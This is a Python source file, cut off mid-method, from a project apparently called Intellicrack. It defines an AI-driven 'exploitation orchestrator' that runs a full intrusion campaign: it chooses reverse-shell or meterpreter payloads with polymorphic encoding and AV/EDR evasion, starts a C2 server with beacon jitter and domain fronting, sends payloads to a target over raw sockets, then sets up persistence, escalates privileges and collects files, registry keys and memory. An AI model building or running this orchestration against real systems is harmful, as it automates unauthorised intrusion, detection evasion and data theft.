"""
This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

import logging
import os
import time
from typing import Any, Dict, List, Optional

"""
Exploitation Orchestrator

Advanced AI orchestration layer that coordinates all exploitation capabilities
with Intellicrack's AI model for fully automated exploitation workflows.
"""

logger = logging.getLogger(__name__)


class ExploitationOrchestrator:
    """
    Central orchestrator that coordinates all exploitation capabilities with AI guidance.

    This class serves as the main integration point between Intellicrack's AI model
    and all the advanced exploitation frameworks implemented in previous phases.
    """

    def __init__(self, ai_model=None):
        """Initialize the exploitation orchestrator.

        Args:
            ai_model: Optional AI model for strategic guidance
        """
        self.logger = logging.getLogger(
            "IntellicrackLogger.ExploitationOrchestrator")
        self.ai_model = ai_model

        # Initialize all exploitation components
        self._init_exploitation_components()

        # Orchestration state
        self.active_campaigns = {}
        self.exploitation_history = []
        self.ai_insights = {}

        # Performance metrics
        self.metrics = {
            "campaigns_executed": 0,
            "success_rate": 0.0,
            "avg_time_to_exploit": 0.0,
            "ai_accuracy": 0.0
        }

    def _init_exploitation_components(self):
        """Initialize all exploitation framework components."""
        try:
            # Core exploitation engines
            from ..ai.vulnerability_research_integration import VulnerabilityResearchAI
            from ..core.c2.c2_manager import C2Manager
            from ..core.exploitation.payload_engine import PayloadEngine
            from ..core.exploitation.persistence_manager import PersistenceManager
            from ..core.exploitation.privilege_escalation import PrivilegeEscalationManager
            from ..core.vulnerability_research.research_manager import ResearchManager

            self.payload_engine = PayloadEngine()
            self.c2_manager = C2Manager()
            self.persistence_manager = PersistenceManager()
            self.privesc_manager = PrivilegeEscalationManager()
            self.research_manager = ResearchManager()
            self.vuln_research_ai = VulnerabilityResearchAI()

            self.logger.info(
                "All exploitation components initialized successfully")

        except Exception as e:
            self.logger.error(
                f"Failed to initialize exploitation components: {e}")
            # Set fallback components to None
            self.payload_engine = None
            self.c2_manager = None
            self.persistence_manager = None
            self.privesc_manager = None
            self.research_manager = None
            self.vuln_research_ai = None

    def orchestrate_full_exploitation(self, target_info: Dict[str, Any],
                                      orchestration_config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Orchestrate a complete exploitation campaign using AI guidance.

        Args:
            target_info: Information about the target system/binary
            orchestration_config: Configuration for orchestration behavior

        Returns:
            Comprehensive results of the exploitation campaign
        """
        campaign_id = f"campaign_{int(time.time())}"

        result = {
            "success": False,
            "campaign_id": campaign_id,
            "target_info": target_info,
            "phases": {},
            "timeline": [],
            "ai_decisions": [],
            "metrics": {},
            "final_status": "failed",
            "error": None
        }

        try:
            self.logger.info(
                f"Starting orchestrated exploitation campaign: {campaign_id}")

            # Initialize campaign tracking
            self.active_campaigns[campaign_id] = {
                "start_time": time.time(),
                "target_info": target_info,
                "status": "running",
                "current_phase": "initialization"
            }

            config = orchestration_config or {}

            # === PHASE 1: AI-Guided Intelligence Gathering ===
            intelligence_phase = self._execute_intelligence_phase(
                campaign_id, target_info, config)
            result["phases"]["intelligence"] = intelligence_phase
            result["timeline"].append({
                "phase": "intelligence",
                "timestamp": time.time(),
                "status": "completed" if intelligence_phase["success"] else "failed",
                "duration": intelligence_phase.get("duration", 0)
            })

            if not intelligence_phase["success"]:
                result["error"] = f"Intelligence phase failed: {intelligence_phase.get('error')}"
                return result

            # Get AI insights for strategy planning
            ai_insights = self._get_ai_strategic_insights(
                target_info, intelligence_phase["results"])
            result["ai_decisions"].append({
                "phase": "strategy_planning",
                "insights": ai_insights,
                "timestamp": time.time()
            })

            # === PHASE 2: AI-Optimized Payload Generation ===
            payload_phase = self._execute_payload_phase(
                campaign_id, target_info, intelligence_phase["results"], ai_insights
            )
            result["phases"]["payload"] = payload_phase
            result["timeline"].append({
                "phase": "payload",
                "timestamp": time.time(),
                "status": "completed" if payload_phase["success"] else "failed",
                "duration": payload_phase.get("duration", 0)
            })

            if not payload_phase["success"]:
                result["error"] = f"Payload phase failed: {payload_phase.get('error')}"
                return result

            # === PHASE 3: Adaptive C2 Infrastructure Setup ===
            c2_phase = self._execute_c2_phase(
                campaign_id, target_info, payload_phase["payload_config"], ai_insights
            )
            result["phases"]["c2"] = c2_phase
            result["timeline"].append({
                "phase": "c2",
                "timestamp": time.time(),
                "status": "completed" if c2_phase["success"] else "failed",
                "duration": c2_phase.get("duration", 0)
            })

            # === PHASE 4: Intelligent Exploitation Execution ===
            exploitation_phase = self._execute_exploitation_phase(
                campaign_id, target_info, payload_phase["payload"], c2_phase["c2_config"], ai_insights
            )
            result["phases"]["exploitation"] = exploitation_phase
            result["timeline"].append({
                "phase": "exploitation",
                "timestamp": time.time(),
                "status": "completed" if exploitation_phase["success"] else "failed",
                "duration": exploitation_phase.get("duration", 0)
            })

            if not exploitation_phase["success"]:
                # ML adaptation removed - using LLM-only approach
                result["phases"]["adaptation"] = {
                    "success": False,
                    "error": "ML adaptation removed - consider using LLM for strategy adaptation"
                }

            # === PHASE 5: Post-Exploitation (if successful) ===
            if exploitation_phase["success"]:
                post_exploit_phase = self._execute_post_exploitation_phase(
                    campaign_id, target_info, exploitation_phase["session_info"], ai_insights
                )
                result["phases"]["post_exploitation"] = post_exploit_phase
                result["timeline"].append({
                    "phase": "post_exploitation",
                    "timestamp": time.time(),
                    "status": "completed" if post_exploit_phase["success"] else "failed",
                    "duration": post_exploit_phase.get("duration", 0)
                })

                result["final_status"] = "success"
                result["success"] = True

            # === PHASE 6: AI Learning and Metrics Collection ===
            learning_phase = self._execute_learning_phase(campaign_id, result)
            result["phases"]["learning"] = learning_phase

            # Calculate campaign metrics
            campaign_metrics = self._calculate_campaign_metrics(result)
            result["metrics"] = campaign_metrics

            # Update global metrics
            self._update_global_metrics(result)

            # Store campaign in history
            self.exploitation_history.append({
                "campaign_id": campaign_id,
                "timestamp": time.time(),
                "target_info": target_info,
                "result": result,
                "success": result["success"]
            })

            # Cleanup campaign tracking
            if campaign_id in self.active_campaigns:
                del self.active_campaigns[campaign_id]

            self.logger.info(
                f"Orchestrated exploitation campaign completed: {campaign_id} - {result['final_status']}")

        except Exception as e:
            self.logger.error(f"Orchestrated exploitation failed: {e}")
            result["error"] = str(e)

            # Cleanup on error
            if campaign_id in self.active_campaigns:
                del self.active_campaigns[campaign_id]

        return result

    def _execute_intelligence_phase(self, campaign_id: str, target_info: Dict[str, Any],
                                    config: Dict[str, Any]) -> Dict[str, Any]:
        """Execute AI-guided intelligence gathering phase."""
        phase_start = time.time()

        result = {
            "success": False,
            "results": {},
            "ai_insights": {},
            "vulnerability_count": 0,
            "risk_assessment": {},
            "duration": 0,
            "error": None
        }

        try:
            self.logger.info(
                f"[{campaign_id}] Starting intelligence gathering phase")

            # Update campaign status
            self.active_campaigns[campaign_id]["current_phase"] = "intelligence"

            # Apply configuration settings for intelligence gathering
            analysis_config = {
                "depth": config.get("analysis_depth", "comprehensive"),
                "timeout": config.get("analysis_timeout", 300),
                "vulnerability_types": config.get("target_vulns", []),
                "ai_model": config.get("ai_model", "default"),
                "parallel_analysis": config.get("parallel_analysis", True),
                "include_dynamic": config.get("include_dynamic_analysis", True),
                "stealth_mode": config.get("stealth_mode", False)
            }

            # Use AI-guided vulnerability research with configuration
            if self.vuln_research_ai:
                # Pass configuration to the analysis
                analysis_result = self.vuln_research_ai.analyze_target_with_ai(
                    target_info.get(
                        "binary_path", target_info.get("target_path")),
                    analysis_options=analysis_config
                )

                if analysis_result["success"]:
                    result["results"] = analysis_result

                    # Apply vulnerability filtering based on config
                    all_vulns = analysis_result.get("analysis_results", {}).get(
                        "initial", {}).get("vulnerabilities", [])
                    if config.get("target_vulns"):
                        filtered_vulns = [v for v in all_vulns if v.get(
                            "type") in config.get("target_vulns")]
                        result["vulnerability_count"] = len(filtered_vulns)
                        # Update the results with filtered vulnerabilities
                        if "analysis_results" in result["results"] and "initial" in result["results"]["analysis_results"]:
                            result["results"]["analysis_results"]["initial"]["vulnerabilities"] = filtered_vulns
                    else:
                        result["vulnerability_count"] = len(all_vulns)

                    result["risk_assessment"] = analysis_result.get(
                        "risk_assessment", {})
                    result["ai_insights"] = analysis_result.get(
                        "ai_recommendations", [])

                    # Apply priority sorting based on config
                    if config.get("prioritize_by_severity", True):
                        result["ai_insights"] = sorted(result["ai_insights"],
                                                       key=lambda x: x.get(
                                                           "severity", 0),
                                                       reverse=True)

                    result["success"] = True
                else:
                    result["error"] = analysis_result.get(
                        "error", "AI analysis failed")
            else:
                result["error"] = "AI research component not available"

            result["duration"] = time.time() - phase_start
            self.logger.info(
                f"[{campaign_id}] Intelligence phase completed in {result['duration']:.2f}s")

        except Exception as e:
            result["error"] = str(e)
            result["duration"] = time.time() - phase_start
            self.logger.error(
                f"[{campaign_id}] Intelligence phase failed: {e}")

        return result

    def _get_ai_strategic_insights(self, target_info: Dict[str, Any],
                                   intelligence_results: Dict[str, Any]) -> Dict[str, Any]:
        """Get AI strategic insights for exploitation planning."""
        insights = {
            "recommended_approach": "standard",
            "payload_strategy": "reverse_shell",
            "evasion_level": "medium",
            "post_exploit_priorities": [],
            "risk_mitigation": [],
            "success_probability": 0.5
        }

        try:
            # Analyze intelligence results with AI
            if self.ai_model and hasattr(self.ai_model, "get_strategic_insights"):
                ai_insights = self.ai_model.get_strategic_insights(
                    target_info, intelligence_results)
                insights.update(ai_insights)
            else:
                # Fallback to rule-based insights
                risk_score = intelligence_results.get(
                    "risk_assessment", {}).get("risk_score", 0.5)
                vuln_count = len(
                    intelligence_results.get("vulnerabilities", []))

                if risk_score > 0.7:
                    insights["recommended_approach"] = "stealth"
                    insights["evasion_level"] = "high"
                elif risk_score < 0.3:
                    insights["recommended_approach"] = "aggressive"
                    insights["evasion_level"] = "low"

                insights["success_probability"] = min(
                    0.9, 0.3 + (vuln_count * 0.1) + risk_score)

        except Exception as e:
            self.logger.warning(f"Failed to get AI strategic insights: {e}")

        return insights

    def _execute_payload_phase(self, campaign_id: str, target_info: Dict[str, Any],
                               intelligence_results: Dict[str, Any], ai_insights: Dict[str, Any]) -> Dict[str, Any]:
        """Execute AI-optimized payload generation phase."""
        phase_start = time.time()

        result = {
            "success": False,
            "payload": None,
            "payload_config": {},
            "metadata": {},
            "duration": 0,
            "error": None
        }

        try:
            self.logger.info(
                f"[{campaign_id}] Starting payload generation phase")

            # Update campaign status
            self.active_campaigns[campaign_id]["current_phase"] = "payload"

            if self.payload_engine:
                from ..core.exploitation.payload_types import (
                    Architecture,
                    EncodingType,
                    PayloadType,
                )

                # Analyze intelligence results to inform payload generation
                vulnerabilities = intelligence_results.get("results", {}).get(
                    "analysis_results", {}).get("initial", {}).get("vulnerabilities", [])
                risk_assessment = intelligence_results.get(
                    "risk_assessment", {})

                # Use risk assessment to adjust payload generation strategy
                risk_level = risk_assessment.get("overall_risk", "medium")
                detection_probability = risk_assessment.get(
                    "detection_probability", 0.5)

                # Adjust payload generation based on risk assessment
                payload_config = {}
                if risk_level == "high" or detection_probability > 0.7:
                    # Use more sophisticated evasion techniques for high-risk targets
                    payload_config.update({
                        "evasion_level": "advanced",
                        "obfuscation": True,
                        "anti_analysis": True,
                        "stealth_mode": True
                    })
                    self.logger.info(
                        f"High risk target detected (risk: {risk_level}, detection: {detection_probability:.2f}), enabling advanced evasion")
                elif risk_level == "low" and detection_probability < 0.3:
                    # Use standard techniques for low-risk targets
                    payload_config = payload_config or {}
                    payload_config.update({
                        "evasion_level": "basic",
                        "speed_optimized": True
                    })
                    self.logger.info(
                        f"Low risk target detected (risk: {risk_level}, detection: {detection_probability:.2f}), using optimized approach")

                # Determine architecture from intelligence results
                binary_info = intelligence_results.get(
                    "results", {}).get("binary_info", {})
                arch_map = {
                    "x86": Architecture.X86,
                    "x64": Architecture.X64,
                    "x86_64": Architecture.X64,
                    "arm": Architecture.ARM,
                    "arm64": Architecture.ARM64
                }
                target_arch = arch_map.get(binary_info.get(
                    "architecture", "x64").lower(), Architecture.X64)

                # Select payload type based on identified vulnerabilities
                payload_type = PayloadType.REVERSE_SHELL  # default
                for vuln in vulnerabilities:
                    vuln_type = vuln.get("type", "").lower()
                    if "buffer_overflow" in vuln_type:
                        payload_type = PayloadType.SHELLCODE
                        break
                    elif "command_injection" in vuln_type:
                        payload_type = PayloadType.STAGED_PAYLOAD
                        break
                    elif "dll_hijacking" in vuln_type:
                        payload_type = PayloadType.DLL_PAYLOAD
                        break

                # Determine optimal payload configuration based on AI insights and intelligence
                payload_strategy = ai_insights.get(
                    "payload_strategy", "reverse_shell")
                evasion_level = ai_insights.get("evasion_level", "medium")

                # Adjust evasion based on detected protections
                detected_protections = intelligence_results.get(
                    "results", {}).get("protections", [])
                if any(p in str(detected_protections).lower() for p in ["antivirus", "edr", "sandbox"]):
                    evasion_level = "high"

                payload_type_mapping = {
                    "reverse_shell": PayloadType.REVERSE_SHELL,
                    "bind_shell": PayloadType.BIND_SHELL,
                    "meterpreter": PayloadType.METERPRETER,
                    "staged": PayloadType.STAGED_PAYLOAD
                }

                # Extract target configuration
                network_config = target_info.get("network_config", {})

                # Enhance payload config with intelligence results
                payload_config = {
                    "lhost": network_config.get("lhost", os.environ.get("EXPLOIT_LHOST", "127.0.0.1")),
                    "lport": network_config.get("lport", int(os.environ.get("EXPLOIT_LPORT", "4444"))),
                    "encoding": EncodingType.POLYMORPHIC if evasion_level in ["medium", "high"] else EncodingType.NONE,
                    "evasion_level": evasion_level,
                    "bad_chars": self._extract_bad_chars(intelligence_results),
                    "bypass_techniques": self._determine_bypass_techniques(intelligence_results),
                    "exploit_method": self._select_exploit_method(vulnerabilities),
                    "target_os": binary_info.get("os", "windows"),
                    "target_version": binary_info.get("version", ""),
                    "aslr_enabled": self._check_protection(intelligence_results, "aslr"),
                    "dep_enabled": self._check_protection(intelligence_results, "dep"),
                    "cet_enabled": self._check_protection(intelligence_results, "cet")
                }

                # Generate payload with intelligence-informed configuration
                payload_result = self.payload_engine.generate_payload(
                    payload_type=payload_type if payload_type != PayloadType.REVERSE_SHELL else
                    payload_type_mapping.get(
                        payload_strategy, PayloadType.REVERSE_SHELL),
                    architecture=target_arch,
                    target_info=target_info,
                    options=payload_config
                )

                if payload_result["success"]:
                    result["success"] = True
                    result["payload"] = payload_result["payload"]
                    result["payload_config"] = payload_config
                    result["metadata"] = payload_result["metadata"]
                else:
                    result["error"] = payload_result.get(
                        "error", "Payload generation failed")
            else:
                result["error"] = "Payload engine not available"

            result["duration"] = time.time() - phase_start
            self.logger.info(
                f"[{campaign_id}] Payload phase completed in {result['duration']:.2f}s")

        except Exception as e:
            result["error"] = str(e)
            result["duration"] = time.time() - phase_start
            self.logger.error(f"[{campaign_id}] Payload phase failed: {e}")

        return result

    def _execute_c2_phase(self, campaign_id: str, target_info: Dict[str, Any],
                          payload_config: Dict[str, Any], ai_insights: Dict[str, Any]) -> Dict[str, Any]:
        """Execute adaptive C2 infrastructure setup phase."""
        phase_start = time.time()

        result = {
            "success": False,
            "c2_config": {},
            "server_info": {},
            "duration": 0,
            "error": None
        }

        try:
            self.logger.info(
                f"[{campaign_id}] Starting C2 infrastructure phase")

            # Update campaign status
            self.active_campaigns[campaign_id]["current_phase"] = "c2"

            if self.c2_manager:
                # Determine optimal C2 configuration based on AI insights and target info
                evasion_level = ai_insights.get("evasion_level", "medium")

                # Adapt C2 protocol based on target environment
                protocol = self._select_c2_protocol(target_info, evasion_level)

                # Determine port based on target firewall rules
                port = self._select_c2_port(target_info, payload_config)

                # Select interface based on network configuration
                interface = self._select_c2_interface(target_info)

                c2_config = {
                    "protocol": protocol,
                    "port": port,
                    "interface": interface,
                    "encryption_method": self._select_encryption_method(target_info, evasion_level),
                    "max_sessions": self._calculate_max_sessions(target_info),
                    "session_timeout": self._calculate_session_timeout(target_info),
                    "beacon_interval": self._calculate_beacon_interval(target_info, evasion_level),
                    "jitter": self._calculate_jitter(evasion_level),
                    "domain_fronting": self._should_use_domain_fronting(target_info, evasion_level),
                    "proxy_settings": self._get_proxy_settings(target_info),
                    "user_agent": self._generate_user_agent(target_info),
                    "callback_urls": self._generate_callback_urls(target_info, protocol, port)
                }

                # Start C2 server
                server_result = self.c2_manager.start_server(c2_config)

                if server_result["success"]:
                    result["success"] = True
                    result["c2_config"] = c2_config
                    result["server_info"] = server_result
                else:
                    result["error"] = server_result.get(
                        "error", "C2 server start failed")
            else:
                result["error"] = "C2 manager not available"

            result["duration"] = time.time() - phase_start
            self.logger.info(
                f"[{campaign_id}] C2 phase completed in {result['duration']:.2f}s")

        except Exception as e:
            result["error"] = str(e)
            result["duration"] = time.time() - phase_start
            self.logger.error(f"[{campaign_id}] C2 phase failed: {e}")

        return result

    def _execute_exploitation_phase(self, campaign_id: str, target_info: Dict[str, Any],
                                    payload: bytes, c2_config: Dict[str, Any],
                                    ai_insights: Dict[str, Any]) -> Dict[str, Any]:
        """Execute intelligent exploitation phase."""
        phase_start = time.time()

        result = {
            "success": False,
            "session_info": {},
            "exploitation_method": "",
            "duration": 0,
            "error": None
        }

        try:
            self.logger.info(f"[{campaign_id}] Starting exploitation phase")

            # Update campaign status
            self.active_campaigns[campaign_id]["current_phase"] = "exploitation"

            # Execute real exploitation using available components
            exploitation_method = ai_insights.get(
                "recommended_approach", "buffer_overflow")

            # Real exploitation workflow:
            # 1. Deploy the payload to the target
            self.logger.info(
                f"[{campaign_id}] Deploying payload using method: {exploitation_method}")

            # Execute payload based on target type and method
            if target_info.get("target_type") == "remote":
                # Remote exploitation
                deploy_result = self._deploy_remote_payload(
                    target_info, payload, c2_config)
            elif target_info.get("target_type") == "local":
                # Local exploitation
                deploy_result = self._deploy_local_payload(
                    target_info, payload, c2_config)
            else:
                # Default to binary analysis exploitation
                deploy_result = self._deploy_binary_payload(
                    target_info, payload, c2_config)

            if deploy_result["success"]:
                # 2. Wait for callback to C2 server
                self.logger.info(f"[{campaign_id}] Waiting for C2 callback")
                callback_result = self._wait_for_c2_callback(
                    c2_config, timeout=30)

                if callback_result["success"]:
                    # 3. Establish session
                    session_result = self._establish_session(
                        callback_result["connection_info"])

                    if session_result["success"]:
                        # 4. Verify access and gather system information
                        verification_result = self._verify_access(
                            session_result["session"])

                        if verification_result["success"]:
                            result["success"] = True
                            result["session_info"] = {
                                "session_id": session_result["session"]["id"],
                                "remote_ip": target_info.get("target_ip", callback_result.get("source_ip", "unknown")),
                                "platform": verification_result.get("platform", target_info.get("platform", "unknown")),
                                "user": verification_result.get("username", "unknown"),
                                "privileges": verification_result.get("privileges", "user"),
                                "process_id": verification_result.get("pid"),
                                "architecture": verification_result.get("architecture")
                            }
                            result["exploitation_method"] = exploitation_method
                            self.logger.info(
                                f"[{campaign_id}] Exploitation successful - session established")
                        else:
                            result[
                                "error"] = f"Session verification failed: {verification_result.get('error', 'unknown')}"
                    else:
                        result[
                            "error"] = f"Session establishment failed: {session_result.get('error', 'unknown')}"
                else:
                    result["error"] = f"No C2 callback received: {callback_result.get('error', 'timeout')}"
            else:
                result["error"] = f"Payload deployment failed: {deploy_result.get('error', 'unknown')}"

            result["duration"] = time.time() - phase_start
            self.logger.info(
                f"[{campaign_id}] Exploitation phase completed in {result['duration']:.2f}s")

        except Exception as e:
            result["error"] = str(e)
            result["duration"] = time.time() - phase_start
            self.logger.error(
                f"[{campaign_id}] Exploitation phase failed: {e}")

        return result

    def _execute_post_exploitation_phase(self, campaign_id: str, target_info: Dict[str, Any],
                                         session_info: Dict[str, Any], ai_insights: Dict[str, Any]) -> Dict[str, Any]:
        """Execute comprehensive post-exploitation phase."""
        phase_start = time.time()

        result = {
            "success": False,
            "persistence_established": False,
            "privileges_escalated": False,
            "lateral_movement_completed": False,
            "data_collected": False,
            "actions_performed": [],
            "duration": 0,
            "error": None
        }

        try:
            self.logger.info(
                f"[{campaign_id}] Starting post-exploitation phase")

            # Update campaign status
            self.active_campaigns[campaign_id]["current_phase"] = "post_exploitation"

            # Use target_info to determine platform and environment
            platform = target_info.get(
                "platform", session_info.get("platform", "windows"))
            environment = target_info.get("environment", {})
            binary_info = target_info.get("binary_info", {})
            actions_performed = []

            # Use binary_info to customize post-exploitation approach
            binary_type = binary_info.get("type", "unknown")
            binary_arch = binary_info.get("architecture", "x64")
            binary_size = binary_info.get("size", 0)

            # Adjust post-exploitation tactics based on binary characteristics
            if binary_type == "service" or binary_size > 10 * 1024 * 1024:  # Large binaries often services/applications
                # Target likely has system-level access or is a critical application
                self.logger.info(
                    f"Large/service binary detected ({binary_type}, {binary_size} bytes), prioritizing stealth")
                stealth_priority = True
                privilege_escalation_priority = False  # Already likely elevated
            elif binary_type == "dll" or "library" in binary_type.lower():
                # DLL injection opportunities
                self.logger.info(
                    f"Library binary detected ({binary_type}), enabling DLL-based persistence")
                stealth_priority = False
                privilege_escalation_priority = True
                dll_persistence_enabled = True
            else:
                # Standard executable
                stealth_priority = False
                privilege_escalation_priority = True

            # Store binary analysis results for later use in post-exploitation
            result["binary_analysis"] = {
                "type": binary_type,
                "architecture": binary_arch,
                "size": binary_size,
                "stealth_priority": stealth_priority,
                "escalation_priority": privilege_escalation_priority if "privilege_escalation_priority" in locals() else True
            }

            # 1. Establish Persistence based on target characteristics
            if self.persistence_manager:
                # Determine payload path based on target OS
                payload_path = self._determine_payload_path(
                    target_info, platform)

                # Select stealth level based on environment
                stealth_level = self._determine_stealth_level(
                    target_info, environment)

                # Get current privilege level from session
                privilege_level = session_info.get("privileges", "user")

                persistence_result = self.persistence_manager.establish_persistence(
                    payload_path=payload_path,
                    target_os=platform,
                    privilege_level=privilege_level,
                    stealth_level=stealth_level,
                    options={"persistence_methods": self._select_persistence_methods(
                        target_info, platform)}
                )

                if persistence_result["success"]:
                    result["persistence_established"] = True
                    if persistence_result.get("methods_established"):
                        methods = [m["method"]
                                   for m in persistence_result["methods_established"]]
                        actions_performed.append(
                            f"Persistence: {', '.join(methods)}")
                    else:
                        actions_performed.append("Persistence: established")

            # 2. Privilege Escalation based on target vulnerabilities
            if self.privesc_manager and session_info.get("privileges") == "user":
                # Select escalation technique based on target info
                escalation_technique = self._select_escalation_technique(
                    target_info, platform)

                privesc_result = self.privesc_manager.escalate_privileges(
                    target_platform=platform,
                    method=escalation_technique
                )

                if privesc_result["success"]:
                    result["privileges_escalated"] = True
                    actions_performed.append(
                        f"PrivEsc: {privesc_result['method']}")

            # 4. Data Collection based on target type
            collection_targets = self._determine_collection_targets(
                target_info, environment)
            collected_data = []

            for target in collection_targets:
                try:
                    if target["type"] == "file":
                        # Collect specific files
                        file_data = self._collect_file_data(
                            target["path"], session_info)
                        if file_data:
                            collected_data.append(file_data)
                    elif target["type"] == "registry":
                        # Collect registry data (Windows)
                        reg_data = self._collect_registry_data(
                            target["key"], session_info)
                        if reg_data:
                            collected_data.append(reg_data)
                    elif target["type"] == "memory":
                        # Collect memory data
                        mem_data = self._collect_memory_data(
                            target["process"], session_info)
                        if mem_data:
                            collected_data.append(mem_data)
                except Exception as e:
                    self.logger.warning(
                        f"Failed to collect {target['type']}: {e}")

            if collected_data:
                result["data_collected"] = True
                actions_performed.append(
                    f"Data: {len(collected_data)} items collected")

            result["actions_performed"] = actions_performed
            result["success"] = len(actions_performed) > 0

            result["duration"] = time.time() - phase_start
            self.logger.info(
                f"[{campaign_id}] Post-exploitation phase completed in {result['duration']:.2f}s")

        except Exception as e:
            result["error"] = str(e)
            result["duration"] = time.time() - phase_start
            self.logger.error(
                f"[{campaign_id}] Post-exploitation phase failed: {e}")

        return result

    def _execute_learning_phase(self, campaign_id: str, campaign_result: Dict[str, Any]) -> Dict[str, Any]:
        """Execute AI learning phase to improve future campaigns."""
        result = {
            "success": False,
            "insights_generated": [],
            "model_updates": [],
            "performance_analysis": {},
            "error": None
        }

        try:
            self.logger.info(f"[{campaign_id}] Starting learning phase")

            # Analyze campaign performance
            timeline = campaign_result.get("timeline", [])
            total_duration = sum(phase.get("duration", 0)
                                 for phase in timeline)
            successful_phases = [
                phase for phase in timeline if phase.get("status") == "completed"]

            performance_analysis = {
                "total_duration": total_duration,
                "successful_phases": len(successful_phases),
                "total_phases": len(timeline),
                "success_rate": len(successful_phases) / len(timeline) if timeline else 0,
                "campaign_success": campaign_result["success"]
            }

            # Generate insights
            insights = []
            if performance_analysis["success_rate"] > 0.8:
                insights.append(
                    "High success rate indicates effective strategy selection")
            if total_duration < 300:  # Less than 5 minutes
                insights.append("Fast execution time suggests good automation")
            if campaign_result["success"]:
                insights.append(
                    "Successful exploitation validates AI recommendations")

            # In a real implementation, this would:
            # 1. Update ML models with campaign data
            # 2. Adjust strategy selection algorithms
            # 3. Improve success probability calculations

            result["success"] = True
            result["insights_generated"] = insights
            result["performance_analysis"] = performance_analysis

            self.logger.info(
                f"[{campaign_id}] Learning phase completed - {len(insights)} insights generated")

        except Exception as e:
            result["error"] = str(e)
            self.logger.error(f"[{campaign_id}] Learning phase failed: {e}")

        return result

    def _calculate_campaign_metrics(self, campaign_result: Dict[str, Any]) -> Dict[str, Any]:
        """Calculate detailed metrics for the campaign."""
        timeline = campaign_result.get("timeline", [])

        metrics = {
            "total_duration": sum(phase.get("duration", 0) for phase in timeline),
            "phase_count": len(timeline),
            "successful_phases": len([p for p in timeline if p.get("status") == "completed"]),
            "ai_decisions_count": len(campaign_result.get("ai_decisions", [])),
            "overall_success": campaign_result["success"],
            "time_to_exploit": 0,
            "efficiency_score": 0
        }

        # Calculate time to exploit (time until successful exploitation)
        for phase in timeline:
            if phase["phase"] == "exploitation" and phase["status"] == "completed":
                metrics["time_to_exploit"] = phase["timestamp"] - \
                    timeline[0]["timestamp"]
                break

        # Calculate efficiency score
        if metrics["phase_count"] > 0:
            phase_success_rate = metrics["successful_phases"] / \
                metrics["phase_count"]
            time_efficiency = 1.0 if metrics["total_duration"] < 300 else 300 / \
                metrics["total_duration"]
            metrics["efficiency_score"] = (
                phase_success_rate + time_efficiency) / 2

        return metrics

    def _update_global_metrics(self, campaign_result: Dict[str, Any]):
        """Update global orchestrator metrics."""
        self.metrics["campaigns_executed"] += 1

        # Update success rate
        successful_campaigns = len(
            [c for c in self.exploitation_history if c["success"]])
        self.metrics["success_rate"] = successful_campaigns / \
            len(self.exploitation_history) if self.exploitation_history else 0

        # Update average time to exploit
        campaign_metrics = campaign_result.get("metrics", {})
        if campaign_metrics.get("time_to_exploit", 0) > 0:
            current_avg = self.metrics["avg_time_to_exploit"]
            count = len([c for c in self.exploitation_history if c["result"].get(
                "metrics", {}).get("time_to_exploit", 0) > 0])
            self.metrics["avg_time_to_exploit"] = (
                current_avg * (count - 1) + campaign_metrics["time_to_exploit"]) / count

    def get_orchestrator_status(self) -> Dict[str, Any]:
        """Get current orchestrator status and metrics."""
        return {
            "active_campaigns": len(self.active_campaigns),
            "total_campaigns_executed": self.metrics["campaigns_executed"],
            "overall_success_rate": self.metrics["success_rate"],
            "average_time_to_exploit": self.metrics["avg_time_to_exploit"],
            "ai_accuracy": self.metrics["ai_accuracy"],
            "components_status": {
                "payload_engine": self.payload_engine is not None,
                "c2_manager": self.c2_manager is not None,
                "persistence_manager": self.persistence_manager is not None,
                "privesc_manager": self.privesc_manager is not None,
                "research_manager": self.research_manager is not None,
                "vuln_research_ai": self.vuln_research_ai is not None
            }
        }

    def get_campaign_history(self, limit: int = 10) -> List[Dict[str, Any]]:
        """Get recent campaign history."""
        return self.exploitation_history[-limit:] if self.exploitation_history else []

    def _deploy_remote_payload(self, target_info: Dict[str, Any], payload: bytes, c2_config: Dict[str, Any]) -> Dict[str, Any]:
        """Deploy payload to remote target via network exploitation."""
        try:
            target_ip = target_info.get("target_ip")
            target_port = target_info.get("target_port", 80)

            if not target_ip:
                return {"success": False, "error": "No target IP specified"}

            # Use C2 configuration for deployment parameters
            deployment_options = {
                "timeout": c2_config.get("timeout", 30),
                "retry_count": c2_config.get("retry_count", 3),
                "stealth_mode": c2_config.get("stealth_mode", False)
            }

            # Use available exploitation methods
            if self.payload_engine:
                deployment_result = self.payload_engine.deploy_remote_payload(
                    target_ip=target_ip,
                    target_port=target_port,
                    payload=payload,
                    method=target_info.get(
                        "exploitation_method", "buffer_overflow"),
                    options=deployment_options
                )
                return deployment_result
            else:
                # Fallback network deployment
                import socket
                import threading

                def deploy_via_socket():
                    try:
                        sock = socket.socket(
                            socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(deployment_options["timeout"])
                        sock.connect((target_ip, target_port))
                        sock.send(payload)
                        sock.close()
                        return True
                    except Exception as e:
                        logger.error(
                            "Exception in exploitation_orchestrator: %s", e)
                        return False

                # Retry deployment based on c2_config
                for attempt in range(deployment_options["retry_count"]):
                    deploy_thread = threading.Thread(target=deploy_via_socket)
                    deploy_thread.start()
                    deploy_thread.join(timeout=deployment_options["timeout"])
                    if deploy_thread.is_alive():
                        logger.debug(
                            f"Deployment attempt {attempt + 1} timed out, retrying...")
                        continue
                    else:
                        logger.info(
                            f"Deployment completed on attempt {attempt + 1}")
                        break

                return {"success": True, "method": "socket_deployment"}

        except Exception as e:
            logger.error("Exception in exploitation_orchestrator: %s", e)
            return {"success": False, "error": str(e)}

    def _deploy_local_payload(self, target_info: Dict[str, Any], payload: bytes, c2_config: Dict[str, Any]) -> Dict[str, Any]:
        """Deploy payload to local target."""
        try:
            binary_path = target_info.get("binary_path")

            if not binary_path:
                return {"success": False, "error": "No binary path specified"}

            # Use C2 configuration for local deployment parameters
            local_options = {
                "persistence_method": c2_config.get("persistence_method", "registry"),
